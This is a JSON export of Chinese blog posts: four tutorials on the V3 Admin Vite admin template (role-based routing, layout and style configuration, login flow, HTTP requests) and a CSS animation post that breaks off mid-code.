{"posts":[{"title":"V3 Admin Vite 权限控制","content":"介绍 V3 Admin Vite 是一个免费开源的中后台管理系统基础解决方案，基于 Vue3、TypeScript、Element Plus、Pinia 和 Vite 等主流技术。另外还有： Vue-Cli 5.x 版: v3-admin Electron 桌面版: v3-electron-vite 目录结构 # v3-admin-vite ├─ .husky # 用户提交代码时格式化代码 ├─ .vscode # 本项目推荐的 vscode 配置和拓展 ├─ public │ ├─ favicon.ico │ ├─ app-loading.css # 首屏加载 loading ├─ src │ ├─ api # api 接口 │ ├─ assets # 静态资源 │ ├─ components # 全局组件 │ ├─ config # 全局配置 │ ├─ constant # 常量/枚举 │ ├─ directives # 全局指令 │ ├─ hooks # 全局 hook │ ├─ icons # svg icon │ ├─ layout # 布局 │ ├─ plugins # 全局插件 │ ├─ router # 路由 │ ├─ store # pinia store │ ├─ styles # 全局样式 │ ├─ utils # 全局公共方法 │ └─ views # 所有页面 │ ├─ App.vue # 入口页面 │ └─ main.ts # 入口文件 ├─ tests # 单元测试 ├─ types # ts 声明 ├─ .env.development # 开发环境 ├─ .env.production # 正式环境 ├─ .env.staging # 预发布环境 ├─ .eslintrc.js # eslint 配置 ├─ .prettier.config.js # prettier 配置 ├─ tsconfig.json # ts 编译配置 ├─ unocss.config.ts # unocss 配置 └─ vite.config.ts # vite 配置 页面权限 动态路由：@/src/router/index.ts 就是用来存放常驻路由和动态路由的文件，如图所示： 需要挂载的路由就存放在 constantRoutes 数组下，比如登录页、首页；需要用户登录并根据角色字段来判断是否有权限的路由，就放在 asyncRoutes 数组下，并且要为该路由配置好 roles 和 name 属性。下面是项目中写好的一个动态路由示例： { path: &quot;/permission&quot;, component: Layout, redirect: &quot;/permission/page&quot;, name: &quot;Permission&quot;, // 不要忘了写 meta: { title: &quot;权限管理&quot;, svgIcon: &quot;lock&quot;, roles: [&quot;admin&quot;, &quot;editor&quot;], // 可以在根路由中设置角色 alwaysShow: true // 将始终显示根菜单 }, children: [ { path: &quot;page&quot;, component: () =&gt; import(&quot;@/views/permission/page.vue&quot;), name: &quot;PagePermission&quot;, // 不要忘了写 meta: { title: &quot;页面权限&quot;, roles: [&quot;admin&quot;] // 或者在子导航中设置角色 } }, { path: &quot;directive&quot;, component: () =&gt; import(&quot;@/views/permission/directive.vue&quot;), name: &quot;DirectivePermission&quot;, // 不要忘了写 meta: { title: &quot;指令权限&quot; // 如果未设置角色，则表示：该页面不需要权限，但会继承根路由的角色 } } ] } 登录 admin 账号时，可以看见这两个页面： 登录 editor 账号时，只能看见一个页面： 项目默认开启动态路由功能，在 @/src/config/async-route.ts 文件中可以找到是否开启动态路由的开关，源码如下，只需要将下面代码中的 asyncRouteSettings.open 设置为 true 就可以开启动态路由功能： /** 动态路由配置 */ interface IAsyncRouteSettings { /** * 是否开启动态路由功能？ * 1. 开启后需要后端配合，在查询用户详情接口返回当前用户可以用来判断并加载动态路由的字段（该项目用的是角色 roles 字段） * 2. 假如项目不需要根据不同的用户来显示不同的页面，则应该将 open: false */ open: boolean /** 当动态路由功能关闭时： * 1. 应该将所有路由都写到常驻路由里面（表明所有登陆的用户能访问的页面都是一样的） * 2. 系统自动给当前登录用户赋值一个没有任何作用的默认角色 */ defaultRoles: Array&lt;string&gt; } const asyncRouteSettings: IAsyncRouteSettings = { open: true, defaultRoles: [&quot;DEFAULT_ROLE&quot;] } export default asyncRouteSettings 开启以后，主要是作用于路由守卫 @/src/router/permission.ts 中的这样一段代码： if (asyncRouteSettings.open) { // 注意：角色必须是一个数组！ 例如: ['admin'] 或 ['developer', 'editor'] await userStore.getInfo() const roles = userStore.roles // 根据角色生成可访问的 Routes（可访问路由 = 常驻路由 + 有访问权限的动态路由） permissionStore.setRoutes(roles) } else { // 没有开启动态路由功能，则启用默认角色 userStore.setRoles(asyncRouteSettings.defaultRoles) permissionStore.setRoutes(asyncRouteSettings.defaultRoles) } 如果开启该功能，那么通过用户详情接口拿到用户角色数组后，根据角色去过滤动态路由，然后再通过 router.addRoute() 挂载过滤之后的动态路由。 如果选择关闭动态路由功能，要记得将所有路由都写在常驻路由数组里面（虽然写在动态路由数组里也行，因为程序兼容了这种偷懒），这样的话，所有登陆的用户能访问的页面都是一模一样的了。 内容权限 @/src/utils/permission.ts 文件里，有一个 checkPermission 权限判断函数： import { useUserStoreHook } from &quot;@/store/modules/user&quot; /** 权限判断函数 */ export const checkPermission = (value: string[]): boolean =&gt; { if (value &amp;&amp; value instanceof Array &amp;&amp; value.length &gt; 0) { const roles = useUserStoreHook().roles const permissionRoles = value return roles.some((role) =&gt; { return permissionRoles.includes(role) }) } else { console.error(&quot;need roles! Like checkPermission(['admin','editor'])&quot;) return false } } 向该函数传递一个权限数组，然后它会去对比当前登录用户的角色数组，如果能匹配上，就返回 true，它的使用方法非常简单，checkPermission 函数配合 v-if 即可： // 引入 import { checkPermission } from &quot;@/utils/permission&quot; // 使用 &lt;el-button v-if=&quot;checkPermission(['admin'])&quot;&gt;按钮&lt;/el-button&gt; 更多详细的使用案例，可见 @/views/permission/directive.vue 页面。 @/directives/permission/index.ts 文件里，写好了权限判断指令 v-permission： import { type Directive } from &quot;vue&quot; import { useUserStoreHook } from &quot;@/store/modules/user&quot; /** 权限指令 */ export const permission: Directive = { mounted(el, binding) { const { value } = binding const roles = useUserStoreHook().roles if (value &amp;&amp; value instanceof Array &amp;&amp; value.length &gt; 0) { const permissionRoles = value const hasPermission = roles.some((role) =&gt; { return permissionRoles.includes(role) }) if (!hasPermission) { el.style.display = &quot;none&quot; } } else { throw new Error(`need roles! Like v-permission=&quot;['admin','editor']&quot;`) } } } 向该指令传递一个权限数组，然后它会去对比当前登录用户的角色数组，如果不能匹配上，就通过 CSS style.display = &quot;none&quot; 将其隐藏，v-permission 已经通过 app.directive() 挂载完成，可以直接在 template 中直接使用： &lt;el-button v-permission=&quot;['admin']&quot;&gt;按钮&lt;/el-button&gt; 更多详细的使用案例，可见 @/views/permission/directive.vue 页面。 参考资料 【V3 Admin Vite】教程五：前端权限（涉及角色、动态路由、权限函数、权限指令） ","link":"https://zkrisj.github.io/post/v3-admin-vite-quan-xian-kong-zhi/"},{"title":"V3 Admin Vite 路由配置、布局配置、全局样式","content":"介绍 V3 Admin Vite 是一个免费开源的中后台管理系统基础解决方案，基于 Vue3、TypeScript、Element Plus、Pinia 和 Vite 等主流技术。另外还有： Vue-Cli 5.x 版: v3-admin Electron 桌面版: v3-electron-vite 目录结构 # v3-admin-vite ├─ .husky # 用户提交代码时格式化代码 ├─ .vscode # 本项目推荐的 vscode 配置和拓展 ├─ public │ ├─ favicon.ico │ ├─ app-loading.css # 首屏加载 loading ├─ src │ ├─ api # api 接口 │ ├─ assets # 静态资源 │ ├─ components # 全局组件 │ ├─ config # 全局配置 │ ├─ constant # 常量/枚举 │ ├─ directives # 全局指令 │ ├─ hooks # 全局 hook │ ├─ icons # svg icon │ ├─ layout # 布局 │ ├─ plugins # 全局插件 │ ├─ router # 路由 │ ├─ store # pinia store │ ├─ styles # 全局样式 │ ├─ utils # 全局公共方法 │ └─ views # 所有页面 │ ├─ App.vue # 入口页面 │ └─ main.ts # 入口文件 ├─ tests # 单元测试 ├─ types # ts 声明 ├─ .env.development # 开发环境 ├─ .env.production # 正式环境 ├─ .env.staging # 预发布环境 ├─ .eslintrc.js # eslint 配置 ├─ .prettier.config.js # prettier 配置 ├─ tsconfig.json # ts 编译配置 ├─ unocss.config.ts # unocss 配置 └─ vite.config.ts # vite 配置 路由配置 路由的定义以及配置在 @/src/router/index.ts 文件里，比如登录路由配置： { path: &quot;/login&quot;, component: () =&gt; import(&quot;@/views/login/index.vue&quot;), meta: { hidden: true } } 平台自定义的配置项都在 meta 属性下，而其他的比如 path、component、redirect、children、name 属性是 vue-router 自带的。 // 设置 noRedirect 的时候该路由在面包屑导航中不可被点击 redirect: 'noRedirect' // 动态路由：必须设定路由的名字，一定要填写不然重置路由可能会出问题 // 如果要在 tags-view 中展示，也必须填 name name: 'router-name' meta: { // 设置该路由在侧边栏和面包屑中展示的名字 title: 'title' // 设置该路由的图标，记得将 svg 导入 @/icons/svg svgIcon: 'svg name' // 设置该路由的图标，直接使用 Element Plus 的 Icon（与 svgIcon 同时设置时，svgIcon 将优先生效） elIcon: 'element-plus icon name' // 默认 false，设置 true 的时候该路由不会在侧边栏出现 hidden: true // 设置该路由进入的权限，支持多个权限叠加（动态路由才需要设置） roles: ['admin', 'editor'] // 默认 true，如果设置为 false，则不会在面包屑中显示 breadcrumb: false // 默认 false，如果设置为 true，它则会固定在 tags-view 中 affix: true // 当一个路由下面的 children 声明的路由大于1个时，自动会变成嵌套的模式 // 只有一个时，会将那个子路由当做根路由显示在侧边栏 // 若想不管路由下面的 children 声明的个数都显示你的根路由 // 可以设置 alwaysShow: true，这样就会忽略之前定义的规则，一直显示根路由 alwaysShow: true // 示例: activeMenu: &quot;/xxx/xxx&quot; // 当设置了该属性进入路由时，则会高亮 activeMenu 属性对应的侧边栏 // 该属性适合使用在有 hidden: true 属性的路由上 activeMenu: '/dashboard' // 是否缓存该路由页面 // 默认为 false，为 true 时代表需要缓存，此时该路由和该页面都需要设置一致的 Name keepAlive: false } 为了让编辑器对这些配置项有类型提示，TS 定义文件放在了 @/types/vue-router.d.ts 中，需要改造或者新增配置项时，也应该同步修改这个文件。 路由缓存 设置路由缓存必须同时满足这四个条件： 路由 keepAlive 为 true。 路由有 Name。 页面有 Name。 路由和页面 Name 保持一致。 以表格组件路由为例： { path: &quot;/table&quot;, component: Layout, redirect: &quot;/table/element-plus&quot;, name: &quot;Table&quot;, meta: { title: &quot;表格&quot;, elIcon: &quot;Grid&quot; }, children: [{ path: &quot;element-plus&quot;, component: () =&gt; import(&quot;@/views/table/element-plus/index.vue&quot;), name: &quot;ElementPlus&quot;, meta: { title: &quot;Element Plus&quot;, keepAlive: true } }, { path: &quot;vxe-table&quot;, component: () =&gt; import(&quot;@/views/table/vxe-table/index.vue&quot;), name: &quot;VxeTable&quot;, meta: { title: &quot;Vxe Table&quot;, keepAlive: true } } ] } 两个路由的 Name 分别是 ElementPlus 和 VxeTable，我们还需要去对应的页面上配置相同的 Name： 配置好 Name 后，页面上输入一些筛选条件，然后切换到其他页面再切换回来发现这些数据还在就表示缓存成功了： 动态路由 把不需要判断权限的路由放置在常驻路由 constantRoutes 中，如 /login、/dashboard。 asyncRoutes 中放置需要动态判断权限并通过 addRoute 动态添加的路由。 注意：动态路由必须配置 name 属性，不然重置路由时，会漏掉没有该属性的动态路由，可能会导致业务 BUG。 布局配置 布局的内容大致是： 页面的右侧默认有一个设置按钮，点击设置按钮后展开的布局配置界面，所有内置的可配置的选项： 在 @/src/config/layout.ts 布局配置文件里将 showSettings 配置项的布尔值修改为 false 即可关闭设置按钮。 每个选项可以通过界面去配置，也可以直接修改他们对应的配置项，这些配置项也是在 @/src/config/layout.ts 中的，配置项和界面的对应关系如下： 设置标签图标 以首页为例，假如不设置图标，则 svgIcon 或 elIcon 属性为空： meta: { title: &quot;首页&quot;, affix: true } 假如想使用 Element Plus 的 Icon，那你应该去 官网 找一个符合要求的图标并复制它的名字。例如这个名为 House 的 Icon，我们直接用 elIcon 配置项使用它： meta: { title: &quot;首页&quot;, elIcon: &quot;House&quot;, affix: true } 假如想使用本地的 SVG 图标，应该将静态资源复制到 @/src/icons/svg 目录下，例如这个名为 dashboard 的图标： meta: { title: &quot;首页&quot;, svgIcon: &quot;dashboard&quot;, affix: true } 全局样式 全局样式相关的的文件，全都在 @/src/styles 目录下： vxe-table.scss：这里可以写样式来覆盖 vxe-table 原本的样式。 element-plus.scss：这里可以写样式来覆盖 element-plus 原本的样式。 transition.scss： 这里可以写动画相关的样式。 mixins.scss：这里可以写和 scss mixin 相关的样式。 variables.css：这里是本项目内置的一些比较重要的和布局、颜色相关的全局样式。 index.scss：这里是所有样式的入口，也可以写样式来覆盖原生 html 的样式。 theme：这里是多主题模式相关的样式文件，目前内置了黑暗模式、深蓝色模式。 简单修改一下 variables.css 的效果： /** 全局 CSS 变量，这种变量不仅可以在 CSS 和 SCSS 中使用，还可以导入到 JS 中使用 */ :root { /** 全局背景色 */ --v3-body-bg-color: #f2f3f5; /** Header 区域 = NavigationBar 组件 + TagsView 组件 */ --v3-header-height: calc(var(--v3-navigationbar-height) + var(--v3-tagsview-height)); /** NavigationBar 组件 */ --v3-navigationbar-height: 50px; /** Sidebar 组件 */ --v3-sidebar-width: 220px; --v3-sidebar-hide-width: 58px; --v3-sidebar-menu-item-height: 60px; --v3-sidebar-menu-tip-line-bg-color: var(--el-color-primary); --v3-sidebar-menu-bg-color: #001428; --v3-sidebar-menu-hover-bg-color: #ffffff10; --v3-sidebar-menu-text-color: #c0c4cc; --v3-sidebar-menu-active-text-color: #ffffff; /** SidebarLogo 组件 */ --v3-sidebarlogo-bg-color: #001428; /** TagsView 组件 */ --v3-tagsview-height: 34px; --v3-tagsview-tag-text-color: #495060; --v3-tagsview-tag-active-text-color: #ffffff; --v3-tagsview-tag-bg-color: #ffffff; --v3-tagsview-tag-active-bg-color: var(--el-color-primary); --v3-tagsview-tag-border-radius: 2px; --v3-tagsview-tag-border-color: #d8dce5; --v3-tagsview-tag-active-border-color: var(--el-color-primary); --v3-tagsview-tag-active-before-color: #ffffff; --v3-tagsview-tag-icon-hover-bg-color: #00000030; --v3-tagsview-tag-icon-hover-color: #ffffff; /** RightPanel 组件 */ --v3-rightpanel-button-bg-color: #001428; } 将上面的全局背景色灰白色 --v3-body-bg-color: #f2f3f5 改成黑色 #000000 后效果如下： 如果想知道某个样式是什么作用，可以直接看注释和命名，因为项目还是非常规范的。 也可以直接复制变量名在编辑器里搜索，就能查看到该变量在什么地方用到了。 参考资料 【V3 Admin Vite】教程四：平台配置（涉及布局、路由菜单、全局样式配置） ","link":"https://zkrisj.github.io/post/v3-admin-vite-lu-you-pei-zhi-bu-ju-pei-zhi-quan-ju-yang-shi/"},{"title":"V3 Admin Vite 侧边栏、面包屑、发送 HTTP 请求","content":"介绍 V3 Admin Vite 是一个免费开源的中后台管理系统基础解决方案，基于 Vue3、TypeScript、Element Plus、Pinia 和 Vite 等主流技术。另外还有： Vue-Cli 5.x 版: v3-admin Electron 桌面版: v3-electron-vite 目录结构 # v3-admin-vite ├─ .husky # 用户提交代码时格式化代码 ├─ .vscode # 本项目推荐的 vscode 配置和拓展 ├─ public │ ├─ favicon.ico │ ├─ app-loading.css # 首屏加载 loading ├─ src │ ├─ api # api 接口 │ ├─ assets # 静态资源 │ ├─ components # 全局组件 │ ├─ config # 全局配置 │ ├─ constant # 常量/枚举 │ ├─ directives # 全局指令 │ ├─ hooks # 全局 hook │ ├─ icons # svg icon │ ├─ layout # 布局 │ ├─ plugins # 全局插件 │ ├─ router # 路由 │ ├─ store # pinia store │ ├─ styles # 全局样式 │ ├─ utils # 全局公共方法 │ └─ views # 所有页面 │ ├─ App.vue # 入口页面 │ └─ main.ts # 入口文件 ├─ tests # 单元测试 ├─ types # ts 声明 ├─ .env.development # 开发环境 ├─ .env.production # 正式环境 ├─ .env.staging # 预发布环境 ├─ .eslintrc.js # eslint 配置 ├─ .prettier.config.js # prettier 配置 ├─ tsconfig.json # ts 编译配置 ├─ unocss.config.ts # unocss 配置 └─ vite.config.ts # vite 配置 侧边栏 侧边栏 @/layout/components/Sidebar 是通过读取路由并结合权限判断而动态生成的（换句话说就是常驻路由 + 有权限的动态路由）。 可以在侧边栏中配置一个外链，只要你在 path 中填写了合法的 url 路径，当你点击侧边栏的外链时就会帮你打开这个页面。 { path: &quot;/link&quot;, component: Layout, children: [{ path: &quot;https://github.com/un-pany/v3-admin-vite&quot;, component: () =&gt; {}, name: &quot;Link&quot;, meta: { title: &quot;外链&quot;, icon: &quot;link&quot; } }] } 面包屑 面包屑 @/layout/components/BreadCrumb 也是根据路由动态生成的，为路由设置 breadcrumb: false 时该路由将不会出现在面包屑中，设置 redirect: 'noRedirect' 时该路由在面包屑中不能被点击。 权限 登录时通过获取当前用户的权限（角色）去比对路由表，生成当前用户具有的权限可访问的路由表，通过 addRoute 动态挂载到 router 上。 页面权限：控制代码都在路由守卫 @/router/permission.ts 中，这里可根据具体的业务做相应的修改。 取消页面权限：假如你的业务场景中没有 动态路由 的概念，那么在 @/config/async-route 里可以关闭该功能，关闭后系统将启用默认角色（一般为最高权限的 admin 角色），即每个登录的用户都可见所有路由： /** 动态路由配置 */ interface IAsyncRouteSettings { /** * 是否开启动态路由功能？ * 1. 开启后需要后端配合，在查询用户详情接口返回当前用户可以用来判断并加载动态路由的字段（该项目用的是角色 roles 字段） * 2. 假如项目不需要根据不同的用户来显示不同的页面，则应该将 open: false */ open: boolean /** 当动态路由功能关闭时： * 1. 应该将所有路由都写到常驻路由里面（表明所有登陆的用户能访问的页面都是一样的） * 2. 系统自动给当前登录用户赋值一个没有任何作用的默认角色 */ defaultRoles: Array&lt;string&gt; } const asyncRouteSettings: IAsyncRouteSettings = { open: true, defaultRoles: [&quot;DEFAULT_ROLE&quot;] } export default asyncRouteSettings 指令权限：简单快速的实现按钮级别的权限判断（已注册到全局，可直接使用）： &lt;el-tag v-permission=&quot;['admin']&quot;&gt;admin可见&lt;/el-tag&gt; &lt;el-tag v-permission=&quot;['editor']&quot;&gt;editor可见&lt;/el-tag&gt; &lt;el-tag v-permission=&quot;['admin','editor']&quot;&gt;admin和editor都可见&lt;/el-tag&gt; 但在某些情况下，不适合使用 v-permission。例如：element-plus 的 el-tab 或 el-table-column 以及其它动态渲染 dom 的场景。你只能通过手动设置 v-if 来实现。 import { checkPermission } from '@/utils/permission' &lt;el-tab-pane v-if=&quot;checkPermission(['admin'])&quot; label=&quot;Admin&quot;&gt;admin可见&lt;/el-tab-pane&gt; &lt;el-tab-pane v-if=&quot;checkPermission(['editor'])&quot; label=&quot;Editor&quot;&gt;editor可见&lt;/el-tab-pane&gt; &lt;el-tab-pane v-if=&quot;checkPermission(['admin','editor'])&quot; label=&quot;AdminEditor&quot;&gt;admin和editor都可见&lt;/el-tab-pane&gt; 发送 HTTP 请求 大致的流程如下： 统一管理的 API @/api/login.ts： import { request } from &quot;@/utils/service&quot; import type * as Login from &quot;./types/login&quot; /** 获取登录验证码 */ export function getLoginCodeApi() { return request&lt;Login.LoginCodeResponseData&gt;({ url: &quot;login/code&quot;, method: &quot;get&quot; }) } /** 登录并返回 Token */ export function loginApi(data: Login.ILoginRequestData) { return request&lt;Login.LoginResponseData&gt;({ url: &quot;users/login&quot;, method: &quot;post&quot;, data }) } /** 获取用户详情 */ export function getUserInfoApi() { return request&lt;Login.UserInfoResponseData&gt;({ url: &quot;users/info&quot;, method: &quot;get&quot; }) } 封装的 @/utils/service.ts：是基于 axios 的封装，封装了全局 request 拦截器、response 拦截器、统一的错误处理、统一做了超时处理、baseURL 设置等。 参考资料 V3 Admin Vite 中文文档 ","link":"https://zkrisj.github.io/post/v3-admin-vite-ce-bian-lan-mian-bao-xie-fa-song-http-qing-qiu/"},{"title":"V3 Admin Vite 登录模块","content":"介绍 V3 Admin Vite 是一个免费开源的中后台管理系统基础解决方案，基于 Vue3、TypeScript、Element Plus、Pinia 和 Vite 等主流技术。另外还有： Vue-Cli 5.x 版: v3-admin Electron 桌面版: v3-electron-vite 目录结构 # v3-admin-vite ├─ .husky # 用户提交代码时格式化代码 ├─ .vscode # 本项目推荐的 vscode 配置和拓展 ├─ public │ ├─ favicon.ico │ ├─ app-loading.css # 首屏加载 loading ├─ src │ ├─ api # api 接口 │ ├─ assets # 静态资源 │ ├─ components # 全局组件 │ ├─ config # 全局配置 │ ├─ constant # 常量/枚举 │ ├─ directives # 全局指令 │ ├─ hooks # 全局 hook │ ├─ icons # svg icon │ ├─ layout # 布局 │ ├─ plugins # 全局插件 │ ├─ router # 路由 │ ├─ store # pinia store │ ├─ styles # 全局样式 │ ├─ utils # 全局公共方法 │ └─ views # 所有页面 │ ├─ App.vue # 入口页面 │ └─ main.ts # 入口文件 ├─ tests # 单元测试 ├─ types # ts 声明 ├─ .env.development # 开发环境 ├─ .env.production # 正式环境 ├─ .env.staging # 预发布环境 ├─ .eslintrc.js # eslint 配置 ├─ .prettier.config.js # prettier 配置 ├─ tsconfig.json # ts 编译配置 ├─ unocss.config.ts # unocss 配置 └─ vite.config.ts # vite 配置 建立目录结构 @/src/api 目录下的 login 文件夹（没有的话就需要新建一个）即代表了登录模块。 在 login 文件夹里面再建立一个 types 文件夹（专门放置和登录模块相关的 TS 类型）和 index.ts。 假如一个模块叫系统管理 system，里面有两个子模块，分别叫用户管理 user、角色管理 role，那么我们建立的目录大致就应该长这个样子： 编写 TS 类型 编写接口的 TS 类型，需要根据后端同事提供的接口文档，拿到接口的请求参数和响应数据的格式。 请求数据类型 ILoginRequestData： export interface ILoginRequestData { /** admin 或 editor */ username: &quot;admin&quot; | &quot;editor&quot; /** 密码 */ password: string /** 验证码 */ code: string } 响应数据类型 LoginResponseData： export type LoginResponseData = IApiResponseData&lt;{ token: string }&gt; IApiResponseData 这个类型作为一个全局类型，被定义在 @/types/api.d.ts 文件里： /** 所有 api 接口的响应数据都应该准守该格式 */ interface IApiResponseData&lt;T&gt; { code: number data: T message: string } 所以最终响应数据类型 LoginResponseData 就相当于： { code: number data: { token: string } message: string } 最终效果如下： 编写接口 发送请求是通过封装好的 Axios，所以第一步就是导入相关的方法： import { request } from &quot;@/utils/service&quot; 将上文写好的登录接口的类型导入进来： import type * as Login from &quot;./types/login&quot; 登录接口的函数名为 loginApi，它接受一个参数 data，类型为 ILoginRequestData。 /** 登录并返回 Token */ export function loginApi(data: Login.ILoginRequestData) { return request&lt;Login.LoginResponseData&gt;({ url: &quot;users/login&quot;, method: &quot;post&quot;, data }) } request&lt;Login.LoginResponseData&gt; 则表示的是待会接口响应成功的 data 数据类型为 LoginResponseData。 url 代表接口地址，method 代表接口方法（get/post/put/delete），data 表示请求体数据（如果是 get 请求，则要换成 params）。 接口写好后如下图： 调用登录接口 首先点击登录按钮将调用的函数是 handleLogin： const handleLogin = () =&gt; { loginFormRef.value?.validate((valid: boolean) =&gt; { if (valid) { loading.value = true useUserStore() .login({ username: loginForm.username, password: loginForm.password, code: loginForm.code }) .then(() =&gt; { router.push({ path: &quot;/&quot; }) }) .catch(() =&gt; { createCode() loginForm.password = &quot;&quot; }) .finally(() =&gt; { loading.value = false }) } else { return false } }) } loginFormRef.value?.validate 是校验登录表单。 useUserStore() 是状态管理器 Pinia 的 Store，调用该 Store 的 login action，并传入用户名、密码、验证码三个参数即可。 login action 返回值是一个 Promise，所以后面链式跟一个 .then 、 .catch 和 .finally，接口调用成功则会执行 .then （跳转到首页），如果途中发生错误，则会执行 .catch，而无论什么情况都会执行 .finally。 状态管理 由于点击登录按钮触发了 useUserStore 的 login action，然后在 login action 中调用这个 loginApi 并传入对应参数（如果这里参数传递错误，那么 TS 就会报错提醒我们，因为我们在上文中定义接口的时候已经约束了类型）。 调用登录接口成功时，我们将接口返回的响应数据 res 中的 token 分别保存到 cookie（对应语句 setToken(res.data.token)）和 当前 Store（对应语句 token.value = res.data.token） 中，如果接口失败，则直接 reject。 如果这里执行了 .then 那么登录页面也将执行 .then，也就会开始跳转路由到首页，那么就会触发路由守卫。 路由守卫 @/src/router/permission.ts 包含了路由守卫全部的代码： import router from &quot;@/router&quot; import { useUserStoreHook } from &quot;@/store/modules/user&quot; import { usePermissionStoreHook } from &quot;@/store/modules/permission&quot; import { ElMessage } from &quot;element-plus&quot; import { whiteList } from &quot;@/config/white-list&quot; import { getToken } from &quot;@/utils/cache/cookies&quot; import asyncRouteSettings from &quot;@/config/async-route&quot; import NProgress from &quot;nprogress&quot; import &quot;nprogress/nprogress.css&quot; NProgress.configure({ showSpinner: false }) router.beforeEach(async (to, _from, next) =&gt; { NProgress.start() const userStore = useUserStoreHook() const permissionStore = usePermissionStoreHook() // 判断该用户是否登录 if (getToken()) { if (to.path === &quot;/login&quot;) { // 如果已经登录，并准备进入 Login 页面，则重定向到主页 next({ path: &quot;/&quot; }) NProgress.done() } else { // 检查用户是否已获得其权限角色 if (userStore.roles.length === 0) { try { if (asyncRouteSettings.open) { // 注意：角色必须是一个数组！ 例如: ['admin'] 或 ['developer', 'editor'] await userStore.getInfo() const roles = userStore.roles // 根据角色生成可访问的 Routes（可访问路由 = 常驻路由 + 有访问权限的动态路由） permissionStore.setRoutes(roles) } else { // 没有开启动态路由功能，则启用默认角色 userStore.setRoles(asyncRouteSettings.defaultRoles) permissionStore.setRoutes(asyncRouteSettings.defaultRoles) } // 将'有访问权限的动态路由' 添加到 Router 中 permissionStore.dynamicRoutes.forEach((route) =&gt; { router.addRoute(route) }) // 确保添加路由已完成 // 设置 replace: true, 因此导航将不会留下历史记录 next({ ...to, replace: true }) } catch (err: any) { // 过程中发生任何错误，都直接重置 Token，并重定向到登录页面 userStore.resetToken() ElMessage.error(err.message || &quot;路由守卫过程发生错误&quot;) next(&quot;/login&quot;) NProgress.done() } } else { next() } } } else { // 如果没有 Token if (whiteList.indexOf(to.path) !== -1) { // 如果在免登录的白名单中，则直接进入 next() } else { // 其他没有访问权限的页面将被重定向到登录页面 next(&quot;/login&quot;) NProgress.done() } } }) router.afterEach(() =&gt; { NProgress.done() }) 判断用户是否登录，没登录则只能进入白名单页面，比如登录页。 如果已经登录，将不允许进入登录页。 如果已经登录，还要检查是否拿到用户角色，如果没有，并且开启了动态路由功能，则要调用用户详情接口。 如果没有开启动态路由功能，则启用默认角色。 一旦发生错误，就重置 Token，并重定向到登录页。 如果通过路由守卫的检查后，就能正常跳转到首页了。 鉴权 后续所有的操作，都将携带保存在前端的 token 去调用接口，token 将是后端服务判断当前请求合不合法的依据，项目本身已经写在 Axios 的封装里面了： 假如 token 已经过期后，理论上接口会抛出一个 http code 401 的错误，我们只需要在响应拦截器里重定向到登录页即可： 参考资料 【V3 Admin Vite】教程三：掌握登录模块（涉及 API、Axios、Pinia、路由守卫、鉴权） ","link":"https://zkrisj.github.io/post/v3-admin-vite-deng-lu-mo-kuai/"},{"title":"使用变量种子计数器扩展 CSS 动画","content":"介绍 不是所有的 CSS 属性都能使用 animation 属性实现动画效果，最典型的例子就是 background-image 渐变。 .gradient { background-image: linear-gradient(45deg, red 50%, blue 50%); } 其中无论是角度（45deg），颜色（red, blue）还是位置（50%）单独作为属性者都是可以动画过渡的，但是合在一起作为渐变背景的时候是无法产生过渡效果的，因为 background-image 的语义是图片。 变量种子计数器 Chrome 等浏览器（不包括 Safari）有个特性，就是当我们使用 @keyframes 定义关键帧的时候，关键帧里面设置的属性也是会运行的，典型的案例就是 content 属性与内容变化。 例如实现一个“正在加载中…”效果： &lt;button&gt;正在加载中&lt;dot&gt;&lt;/dot&gt;&lt;/button&gt; dot::before { content: '...'; position: absolute; animation: dot 3s infinite step-start both; } dot:after { content: '...'; color: transparent; } @keyframes dot { 33% { content: '.'; } 66% { content: '..'; } } 不仅普通的 CSS 属性可以在 CSS 动画关键帧中运行，CSS 自定义属性（CSS 变量）也可以在 CSS 动画关键帧中运行。例如： @keyframes var { 33% { --someVar: 33%; } 66% { --someVar: 66%; } } 如果我们某一个 CSS 属性值是基于这个 --someVar 变量构成的，那岂不是就算这个属性值不支持 CSS 动画，我只要让每一个百分比值的间隙足够的小，不也能够实现一个平滑的动画效果？ 具体做法就是，把 CSS 动画关键帧从 0%-100% 分成 101 份，然后每一份从 0 开始依次计数，就像是个计数器一样，然后把这个计数器分配给一个特定的 CSS 变量。最终我们可以得到一个如下所示的 CSS 动画“变量种子计数器”。 @keyframes seed { 0%{--seed:0}1%{--seed:1}2%{--seed:2}3%{--seed:3}4%{--seed:4}5%{--seed:5}6%{--seed:6}7%{--seed:7}8%{--seed:8}9%{--seed:9}10%{--seed:10}11%{--seed:11}12%{--seed:12}13%{--seed:13}14%{--seed:14}15%{--seed:15}16%{--seed:16}17%{--seed:17}18%{--seed:18}19%{--seed:19}20%{--seed:20}21%{--seed:21}22%{--seed:22}23%{--seed:23}24%{--seed:24}25%{--seed:25}26%{--seed:26}27%{--seed:27}28%{--seed:28}29%{--seed:29}30%{--seed:30}31%{--seed:31}32%{--seed:32}33%{--seed:33}34%{--seed:34}35%{--seed:35}36%{--seed:36}37%{--seed:37}38%{--seed:38}39%{--seed:39}40%{--seed:40}41%{--seed:41}42%{--seed:42}43%{--seed:43}44%{--seed:44}45%{--seed:45}46%{--seed:46}47%{--seed:47}48%{--seed:48}49%{--seed:49}50%{--seed:50}51%{--seed:51}52%{--seed:52}53%{--seed:53}54%{--seed:54}55%{--seed:55}56%{--seed:56}57%{--seed:57}58%{--seed:58}59%{--seed:59}60%{--seed:60}61%{--seed:61}62%{--seed:62}63%{--seed:63}64%{--seed:64}65%{--seed:65}66%{--seed:66}67%{--seed:67}68%{--seed:68}69%{--seed:69}70%{--seed:70}71%{--seed:71}72%{--seed:72}73%{--seed:73}74%{--seed:74}75%{--seed:75}76%{--seed:76}77%{--seed:77}78%{--seed:78}79%{--seed:79}80%{--seed:80}81%{--seed:81}82%{--seed:82}83%{--seed:83}84%{--seed:84}85%{--seed:85}86%{--seed:86}87%{--seed:87}88%{--seed:88}89%{--seed:89}90%{--seed:90}91%{--seed:91}92%{--seed:92}93%{--seed:93}94%{--seed:94}95%{--seed:95}96%{--seed:96}97%{--seed:97}98%{--seed:98}99%{--seed:99}100%{--seed:100} } 上面这段 @keyframes seed{} 相关 CSS 代码就是一个可以无限使用的“动画种子”，无论是那些原本支持 CSS 动画的属性，还是不支持 CSS 动画的属性，只要它的属性值是与数值相关的，都能够借助这个“动画种子”实现动画效果。 例如一开始那个线性渐变的例子，我们可以让渐变旋转角度和我们“动画种子”中的 --seed 变量相关联，配合 animation 属性就能实现渐变旋转的效果了： .gradient { width: 150px; height: 150px; background-image: 